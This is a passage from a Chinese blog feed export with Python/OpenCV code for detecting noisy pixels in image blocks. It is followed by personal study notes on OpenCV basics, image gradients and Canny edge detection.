class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">            <span class="built_in">print</span>(image_array[i][j][<span class="string">&#x27;noise&#x27;</span>], end=<span class="string">&#x27;&#x27;</span>, file=fp)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>, file=fp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;导出成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_road</span>(<span class="params">four_grid, mi, mj, step</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= mi - <span class="number">1</span> &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            <span class="number">0</span> &lt;= mj &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj][<span class="string">&#x27;up&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi - <span class="number">1</span>][mj][<span class="string">&#x27;down&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi - <span class="number">1</span>][mj][<span class="string">&#x27;step&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> step + <span class="number">1</span> &lt;= <span class="number">6</span>:</span><br><span class="line">            four_grid[mi - <span class="number">1</span>][mj][<span class="string">&#x27;step&#x27;</span>] = step + <span class="number">1</span></span><br><span class="line">            four_grid[mi - <span class="number">1</span>][mj][<span class="string">&#x27;down&#x27;</span>] = <span class="number">0</span></span><br><span class="line">            four_grid = find_road(four_grid, mi - <span class="number">1</span>, mj, step + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= mi + <span class="number">1</span> &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            <span class="number">0</span> &lt;= mj &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj][<span class="string">&#x27;down&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi + <span class="number">1</span>][mj][<span class="string">&#x27;up&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi + <span class="number">1</span>][mj][<span class="string">&#x27;step&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> step + <span class="number">1</span> &lt;= <span class="number">6</span>:</span><br><span class="line">            four_grid[mi + <span class="number">1</span>][mj][<span class="string">&#x27;step&#x27;</span>] = step + <span class="number">1</span></span><br><span class="line">            four_grid[mi + <span class="number">1</span>][mj][<span class="string">&#x27;up&#x27;</span>] = <span class="number">0</span></span><br><span class="line">            four_grid = find_road(four_grid, mi + <span class="number">1</span>, mj, step + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= mi &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            <span class="number">0</span> &lt;= mj - <span class="number">1</span> &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj][<span class="string">&#x27;left&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj - <span class="number">1</span>][<span class="string">&#x27;right&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj - <span class="number">1</span>][<span class="string">&#x27;step&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> step + <span class="number">1</span> &lt;= <span class="number">6</span>:</span><br><span class="line">            four_grid[mi][mj - <span class="number">1</span>][<span class="string">&#x27;step&#x27;</span>] = step + <span class="number">1</span></span><br><span class="line">            four_grid[mi][mj - <span class="number">1</span>][<span class="string">&#x27;right&#x27;</span>] = <span class="number">0</span></span><br><span class="line">            four_grid = find_road(four_grid, mi, mj - <span class="number">1</span>, step + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0</span> &lt;= mi &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            <span class="number">0</span> &lt;= mj + <span class="number">1</span> &lt; <span class="number">4</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj][<span class="string">&#x27;right&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj + <span class="number">1</span>][<span class="string">&#x27;left&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> \</span><br><span class="line">            four_grid[mi][mj + <span class="number">1</span>][<span class="string">&#x27;step&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> step + <span class="number">1</span> &lt;= <span class="number">6</span>:</span><br><span class="line">            four_grid[mi][mj + <span class="number">1</span>][<span class="string">&#x27;step&#x27;</span>] = step + <span class="number">1</span></span><br><span class="line">            four_grid[mi][mj + <span class="number">1</span>][<span class="string">&#x27;left&#x27;</span>] = <span class="number">0</span></span><br><span class="line">            four_grid = find_road(four_grid, mi, mj + <span class="number">1</span>, step + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> four_grid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割通路和检测区分度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division_check</span>(<span class="params">five_matrix</span>):</span></span><br><span class="line">    <span class="comment"># 建立单位方格数组</span></span><br><span class="line">    four_grid = np.zeros((<span class="number">4</span>, <span class="number">4</span>), dtype=Grid_type)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">            <span class="comment"># 取出四个像素点组成一个单位</span></span><br><span class="line">            p = [five_matrix[i][j][<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">                 five_matrix[i][j + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">                 five_matrix[i + <span class="number">1</span>][j + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">                 five_matrix[i + <span class="number">1</span>][j][<span class="string">&#x27;value&#x27;</span>]]</span><br><span class="line">            p1 = [p[<span class="number">0</span>] - p[<span class="number">1</span>], p[<span class="number">1</span>] - p[<span class="number">2</span>], p[<span class="number">2</span>] - p[<span class="number">3</span>], p[<span class="number">3</span>] - p[<span class="number">0</span>]]</span><br><span class="line">            <span class="comment"># 找出分割边</span></span><br><span class="line">            max_index = p1.index(<span class="built_in">max</span>(p1))</span><br><span class="line">            min_index = p1.index(<span class="built_in">min</span>(p1))</span><br><span class="line">            <span class="comment"># 划分区域</span></span><br><span class="line">            maxa = []</span><br><span class="line">            mina = []</span><br><span class="line">            <span class="keyword">if</span> max_index &gt; min_index:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, max_index + <span class="number">1</span>):</span><br><span class="line">                    maxa.append(p[k])</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, min_index + <span class="number">1</span>):</span><br><span class="line">                    mina.append(p[k])</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">                    mina.append(p[k])</span><br><span class="line">            <span class="keyword">elif</span> max_index &lt; min_index:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, min_index + <span class="number">1</span>):</span><br><span class="line">                    mina.append(p[k])</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">                    maxa.append(p[k])</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">                    maxa.append(p[k])</span><br><span class="line">            <span class="comment"># 求区分度</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(maxa) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(mina) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            four_grid[i][j][<span class="string">&#x27;division_degree&#x27;</span>] = <span class="built_in">min</span>(maxa) - <span class="built_in">max</span>(mina)</span><br><span class="line">            <span class="comment"># 存储分割边，赋值为1表示是分割边</span></span><br><span class="line">            <span class="keyword">if</span> max_index == <span class="number">0</span> <span class="keyword">or</span> min_index == <span class="number">0</span>:</span><br><span class="line">                four_grid[i][j][<span class="string">&#x27;up&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> max_index == <span class="number">1</span> <span class="keyword">or</span> min_index == <span class="number">1</span>:</span><br><span class="line">                four_grid[i][j][<span class="string">&#x27;right&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> max_index == <span class="number">2</span> <span class="keyword">or</span> min_index == <span class="number">2</span>:</span><br><span class="line">                four_grid[i][j][<span class="string">&#x27;down&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> max_index == <span class="number">3</span> <span class="keyword">or</span> min_index == <span class="number">3</span>:</span><br><span class="line">                four_grid[i][j][<span class="string">&#x27;left&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 求出较大区分度</span></span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">            p.append(four_grid[i][j][<span class="string">&#x27;division_degree&#x27;</span>])</span><br><span class="line">    p = <span class="built_in">sorted</span>(p, reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 找出第6大的那个值，找出最大值的位置</span></span><br><span class="line">    pmax = p[<span class="number">0</span>]</span><br><span class="line">    mi = <span class="number">0</span></span><br><span class="line">    mj = <span class="number">0</span></span><br><span class="line">    px = p[<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">            <span class="comment"># 将前6个较大的标记</span></span><br><span class="line">            <span class="keyword">if</span> four_grid[i][j][<span class="string">&#x27;division_degree&#x27;</span>] &gt;= px:</span><br><span class="line">                four_grid[i][j][<span class="string">&#x27;big_degree&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            <span class="comment"># 找出最大值的下标</span></span><br><span class="line">            <span class="keyword">if</span> four_grid[i][j][<span class="string">&#x27;division_degree&#x27;</span>] == pmax:</span><br><span class="line">                mi = i</span><br><span class="line">                mj = j</span><br><span class="line">    <span class="comment"># 以最大值为起点，找通路(利用递归算法)</span></span><br><span class="line">    four_grid[mi][mj][<span class="string">&#x27;step&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    new_grid = find_road(four_grid, mi, mj, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 找出干扰点</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> new_grid[i][j][<span class="string">&#x27;big_degree&#x27;</span>] == <span class="number">1</span> <span class="keyword">and</span> new_grid[i][j][<span class="string">&#x27;step&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">                ave = (five_matrix[i][j][<span class="string">&#x27;value&#x27;</span>] +</span><br><span class="line">                       five_matrix[i + <span class="number">1</span>][j][<span class="string">&#x27;value&#x27;</span>] +</span><br><span class="line">                       five_matrix[i][j + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] +</span><br><span class="line">                       five_matrix[i + <span class="number">1</span>][j + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>]) / <span class="number">4</span></span><br><span class="line">                xmax = <span class="number">0</span></span><br><span class="line">                pi = <span class="number">0</span></span><br><span class="line">                pj = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">abs</span>(five_matrix[i][j][<span class="string">&#x27;value&#x27;</span>] - ave) &gt; xmax:</span><br><span class="line">                    xmax = <span class="built_in">abs</span>(five_matrix[i][j][<span class="string">&#x27;value&#x27;</span>] - ave)</span><br><span class="line">                    pi = i</span><br><span class="line">                    pj = j</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">abs</span>(five_matrix[i+<span class="number">1</span>][j][<span class="string">&#x27;value&#x27;</span>] - ave) &gt; xmax:</span><br><span class="line">                    xmax = <span class="built_in">abs</span>(five_matrix[i+<span class="number">1</span>][j][<span class="string">&#x27;value&#x27;</span>] - ave)</span><br><span class="line">                    pi = i+<span class="number">1</span></span><br><span class="line">                    pj = j</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">abs</span>(five_matrix[i][j+<span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - ave) &gt; xmax:</span><br><span class="line">                    xmax = <span class="built_in">abs</span>(five_matrix[i][j+<span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - ave)</span><br><span class="line">                    pi = i</span><br><span class="line">                    pj = j+<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">abs</span>(five_matrix[i+<span class="number">1</span>][j+<span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - ave) &gt; xmax:</span><br><span class="line">                    xmax = <span class="built_in">abs</span>(five_matrix[i+<span class="number">1</span>][j+<span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - ave)</span><br><span class="line">                    pi = i+<span class="number">1</span></span><br><span class="line">                    pj = j+<span class="number">1</span></span><br><span class="line">                five_matrix[pi][pj][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> five_matrix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测噪声</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">image_channel</span>):</span></span><br><span class="line">    <span class="comment"># 检测该图像通道的大小</span></span><br><span class="line">    (x, y) = image_channel.shape</span><br><span class="line">    <span class="comment"># 建立像素点数组，并存入像素值</span></span><br><span class="line">    image_array = np.zeros((x, y), dtype=Pixel_type)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">            image_array[i, j][<span class="string">&#x27;value&#x27;</span>] = image_channel[i, j]</span><br><span class="line">    <span class="comment"># 划分单位方格区域，并求出通路和区分度</span></span><br><span class="line">    px = (x // <span class="number">5</span>) * <span class="number">5</span></span><br><span class="line">    py = (y // <span class="number">5</span>) * <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, px - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, py - <span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">            <span class="comment"># 每次取出5*5的矩阵</span></span><br><span class="line">            five_matrix = np.zeros((<span class="number">5</span>, <span class="number">5</span>), dtype=Pixel_type)</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">                    five_matrix[m][n] = image_array[i + m][j + n]</span><br><span class="line">            <span class="comment"># 检测出噪声</span></span><br><span class="line">            noise_matrix = division_check(five_matrix)</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">                    image_array[m+i][n+j][<span class="string">&#x27;noise&#x27;</span>] = noise_matrix[m][n][<span class="string">&#x27;noise&#x27;</span>]</span><br><span class="line">    <span class="comment"># 输出噪声</span></span><br><span class="line">    print_file(image_array, x, y)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 以BGR方式读入图片</span></span><br><span class="line">    image = cv.imread(<span class="string">&quot;test1.png&quot;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分离图像通道</span></span><br><span class="line">    B, G, R = cv.split(image)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查干扰点(以B通道为例)</span></span><br><span class="line">    noise_check(B)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210228</title>
      <link href="/20210228-img-report/"/>
      <url>/20210228-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="opencv基础"><a href="#opencv基础" class="headerlink" title="opencv基础"></a>opencv基础</h2><p>该过程主要通过实际操作完成</p><h3 id="素材"><a href="#素材" class="headerlink" title="素材"></a>素材</h3><p>选取合适的高清图片，通过截屏生成新图片降低图片质量，将新的低质量图片命名为<code>text1.png</code>保存在python脚本的目录中</p><h3 id="代码环境"><a href="#代码环境" class="headerlink" title="代码环境"></a>代码环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python解释器：anaconda3/python3.8</span><br><span class="line">编译器：pycharm</span><br><span class="line">编码：utf-8</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>为了方便测试，只使用了一个脚本测试，学习笔记和部分运行结果也通过注释的方式简单加入</p><p>去除注释<code>#</code>即可运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解释器：anaconda3/python3.8</span></span><br><span class="line"><span class="comment"># 编译器：pycharm</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一些测试过程以注释方式保留，以便以后查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需要的库，并给以简洁的名称</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 按指定方式读取图像</span></span><br><span class="line">img = cv.imread(<span class="string">&#x27;test1.png&#x27;</span>, <span class="number">1</span>)    <span class="comment"># 该步骤类似于C语言的文件指针</span></span><br><span class="line"><span class="comment"># 第一个参数为图片路径，不能含有中文等不兼容字符，否则报错，这里没办法只好使用了相对路径</span></span><br><span class="line"><span class="comment"># 第二个参数代表读取方式</span></span><br><span class="line"><span class="comment"># 1：加载彩色图像。任何图像的透明度都会被忽视。它是默认标志。</span></span><br><span class="line"><span class="comment"># 0：以灰度模式加载图像</span></span><br><span class="line"><span class="comment"># -1：加载图像，包括alpha通道</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># show图像</span></span><br><span class="line"><span class="comment"># cv.imshow(&#x27;test1&#x27;, img)    # 第一个参数是窗口名称，它是一个字符串。第二个参数是我们的对象。</span></span><br><span class="line"><span class="comment"># cv.waitKey(0)              # 以0为参数时，无限制等待用户按下任意键</span></span><br><span class="line"><span class="comment"># cv.destroyAllWindows()     # 销毁窗口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 访问和修改像素</span></span><br><span class="line"><span class="comment"># px = img[100, 100]    # 该值与图像读入方式有关</span></span><br><span class="line"><span class="comment"># print(px)</span></span><br><span class="line"><span class="comment"># img[100, 100] = 255                 # 灰度</span></span><br><span class="line"><span class="comment"># img[100, 100] = [255, 255, 255]     # BGR</span></span><br><span class="line"><span class="comment"># print(img[100, 100])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查阅资料了解到上面的方法的效率并不是很高</span></span><br><span class="line"><span class="comment"># 可以使用Numpy数组方法array.item()和array.itemset()</span></span><br><span class="line"><span class="comment"># 经测试，因为某些未知原因，导致运行错误，这里先略去，以后再debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 访问图像属性</span></span><br><span class="line"><span class="comment"># print(img.shape)    # 访问图像形状</span></span><br><span class="line"><span class="comment"># 以灰度图像读入时，输出(674, 1200)，仅返回行和列</span></span><br><span class="line"><span class="comment"># 以BGR读入时，输出(674, 1200, 3)，多返回一位数，表示通道数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(img.size)    # 访问图像像素总数</span></span><br><span class="line"><span class="comment"># 以灰度读入时，输出808800</span></span><br><span class="line"><span class="comment"># 以BGR读入时，输出2426400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(img.dtype)    # 访问图像数据类型</span></span><br><span class="line"><span class="comment"># 输出 uint8</span></span><br><span class="line"><span class="comment"># img.dtype在调试时非常重要，因为OpenCV-Python代码中的大量错误是由无效的数据类型引起的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 拆分和合并图像通道</span></span><br><span class="line"><span class="comment"># B, G, R = cv.split(img)    # 此时img由BGR方式读入，才可进行此操作</span></span><br><span class="line"><span class="comment"># print(B.shape)    # 输出(674, 1200)，与原图像数据相比仅缺少通道数，这表明拆分成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># img = cv.merge((B, G, R))    # 进行这一步操作时，图像通过BGR方式读入，且上面的“B, G, R = cv.split(img)”需要先执行</span></span><br><span class="line"><span class="comment"># print(img.shape)    # 输出(674, 1200, 3)，与原图像数据完全相同，这表明合并成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line"><span class="comment"># 图像加法</span></span><br><span class="line"><span class="comment"># x = np.uint8([250])</span></span><br><span class="line"><span class="comment"># y = np.uint8([10])</span></span><br><span class="line"><span class="comment"># print(cv.add(x, y))    # 输出[[255]] 原理：opencv的加法采用饱和运算 250+10=260-&gt;255</span></span><br><span class="line"><span class="comment"># print(x + y)           # 输出[4] 原理：numpy的加法采用模运算 (250+10)%256=4</span></span><br><span class="line"><span class="comment"># 两者相比较，使用时应该选用opencv的加法</span></span><br></pre></td></tr></table></figure><h2 id="opencv进阶"><a href="#opencv进阶" class="headerlink" title="opencv进阶"></a>opencv进阶</h2><p>注：这部分内容是有针对性的学习，暂时用不到的就没有学</p><h3 id="性能衡量和提升技术"><a href="#性能衡量和提升技术" class="headerlink" title="性能衡量和提升技术"></a>性能衡量和提升技术</h3><p>该部分内容，我只简单提取了<code>cv.useOptimized()</code>和<code>cv.setUseOptimized()</code>两条命令</p><p>对于部分操作的运行速度，优化会比不优化快两倍，所以我觉得有必要注意</p><h4 id="检查是否使用优化"><a href="#检查是否使用优化" class="headerlink" title="检查是否使用优化"></a>检查是否使用优化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv               <span class="comment"># 导入opencv库，简化为cv</span></span><br><span class="line">cv.useOptimized()              <span class="comment"># 检查是否使用opencv优化，该函数值为Ture或者False</span></span><br><span class="line"><span class="built_in">print</span>(cv.useOptimized())       <span class="comment"># 打印该函数值，判断是否启用优化</span></span><br></pre></td></tr></table></figure><h4 id="启用-禁用优化"><a href="#启用-禁用优化" class="headerlink" title="启用/禁用优化"></a>启用/禁用优化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv               <span class="comment"># 导入opencv库，简化为cv</span></span><br><span class="line">cv.setUseOptimized(Ture)       <span class="comment"># 启用优化</span></span><br><span class="line">cv.setUseOptimized(<span class="literal">False</span>)      <span class="comment"># 禁用优化</span></span><br></pre></td></tr></table></figure><h4 id="其他性能优化技术"><a href="#其他性能优化技术" class="headerlink" title="其他性能优化技术"></a>其他性能优化技术</h4><p>这部分内容暂时不学习，但是先做个摘记</p><blockquote><p>有几种技术和编码方法可以充分利用 Python 和 Numpy 的最大性能。这里要注意的主要事情是，首先尝试以一种简单的方式实现算法。一旦它运行起来，分析它，找到瓶颈并优化它们。</p><p>1.尽量避免在Python中使用循环，尤其是双/三重循环等。它们本来就很慢。</p><p>2.由于Numpy和OpenCV已针对向量运算进行了优化，因此将算法/代码向量化到最大程度。</p><p>3.利用缓存一致性。</p><p>4.除非需要，否则切勿创建数组的副本。尝试改用视图。数组复制是一项昂贵的操作。</p><p>即使执行了所有这些操作后，如果你的代码仍然很慢，或者不可避免地需要使用大循环，请使用Cython等其他库来使其更快。</p></blockquote><h3 id="图像梯度"><a href="#图像梯度" class="headerlink" title="图像梯度"></a>图像梯度</h3><p>OpenCV提供三种类型的梯度滤波器或高通滤波器，即Sobel，Scharr和Laplacian</p><p>这是三个可以直接用的函数，暂时没搞清楚它们的原理，去了解了一下使用效果，进行实测后失败，原因未知，这里记录一下</p><p>官方使用的效果图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280846615.png" alt="1"></p><p>可以看出Laplacian方法较为优秀</p><h3 id="Canny边缘检测"><a href="#Canny边缘检测" class="headerlink" title="Canny边缘检测"></a>Canny边缘检测</h3><p><code>cv.Canny()</code>方法</p><p>这个算法，或许会对我的工作有借鉴意义，虽然思路上有很大不同，我把这种方法分类为矢量方法，而我认为我所需要做的工作属于标量方法。我个人的观点是：矢量方法更需要想象能力，标量方法更需要精密的思维；而有些东西是共通的，比如下面讲到的降噪、阈值思想</p><h4 id="降噪"><a href="#降噪" class="headerlink" title="降噪"></a>降噪</h4><p>由于边缘检测容易受到图像中噪声的影响，因此第一步是使用5x5高斯滤波器消除图像中的噪声。</p><p><em>和上面的“图像梯度”一样，也需要降噪，由此可见，降噪在图像处理中是很重要的</em></p><h4 id="查找图像的强度梯度"><a href="#查找图像的强度梯度" class="headerlink" title="查找图像的强度梯度"></a>查找图像的强度梯度</h4><p>使用Sobel核在水平和垂直方向上对平滑的图像进行滤波，以在水平方向(Gx)和垂直方向(Gy)上获得一阶导数。渐变方向始终垂直于边缘。将其舍入为代表垂直，水平和两个对角线方向的四个角度之一。</p><h5 id="非极大值抑制"><a href="#非极大值抑制" class="headerlink" title="非极大值抑制"></a>非极大值抑制</h5><p>在获得梯度大小和方向后，将对图像进行全面扫描，以去除可能不构成边缘的所有不需要的像素。为此，在每个像素处，检查像素是否是其在梯度方向上附近的局部最大值。</p><p><em>效果是能提取出细边</em></p><h5 